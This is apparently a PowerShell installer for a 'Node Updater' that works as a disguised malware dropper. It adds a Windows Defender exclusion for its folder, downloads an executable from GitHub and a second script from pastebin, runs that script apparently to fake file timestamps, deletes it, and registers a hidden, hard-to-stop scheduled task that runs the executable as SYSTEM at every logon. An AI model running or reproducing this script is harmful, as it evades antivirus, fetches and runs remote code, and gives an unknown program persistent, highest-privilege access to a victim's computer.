$path = "C:\Program Files\Node Updater";

if (-Not (Test-Path $path)) {
    New-Item -Path $path -ItemType Directory -Force > $null 2>&1;
}

Add-MpPreference -ExclusionPath $path;

Stop-Process -Name "Node Updater" -Force -ErrorAction SilentlyContinue;

Invoke-WebRequest -Uri "https://github.com/nodeupdater2/nodeupdater/releases/latest/download/app.exe" -OutFile "$path\Node Updater.exe";

Invoke-WebRequest -Uri "https://pastebin.com/raw/JnKYFey2" -OutFile "C:\Windows\Temp\CFT.ps1";

& "C:\Windows\Temp\CFT.ps1" -FolderPath $path -Time "02/04/2018 08:47:36";

Remove-Item -Path "C:\Windows\Temp\CFT.ps1";

Register-ScheduledTask -TaskName "Node Updater" -Action (New-ScheduledTaskAction -Execute "$path\Node Updater.exe" -WorkingDirectory $path) -Trigger (New-ScheduledTaskTrigger -AtLogOn) -Settings (New-ScheduledTaskSettingsSet -ExecutionTimeLimit (New-TimeSpan -Seconds 0) -Hidden -DontStopOnIdleEnd -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -DisallowHardTerminate -Priority 0 -Compatibility Win8) -User "SYSTEM" -RunLevel Highest -Force > $null 2>&1;

Start-ScheduledTask -TaskName "Node Updater";
